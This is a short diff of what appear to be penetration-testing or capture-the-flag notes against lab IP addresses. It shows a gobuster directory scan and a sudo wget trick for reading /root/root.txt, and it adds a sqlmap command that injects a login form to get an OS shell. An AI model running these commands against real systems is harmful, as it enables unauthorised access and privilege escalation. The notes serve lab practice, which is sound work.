@@ -14,3 +14,6 @@ gobuster dir --url https://10.129.240.189 --wordlist /usr/share/wordlists/dirbus
 using wget to reveal the text as /root/root
 
 sudo wget --input-file /root/root.txt
+
+sqlmap --forms -u http://192.168.238.140/login.asp --os-shell --batch
+
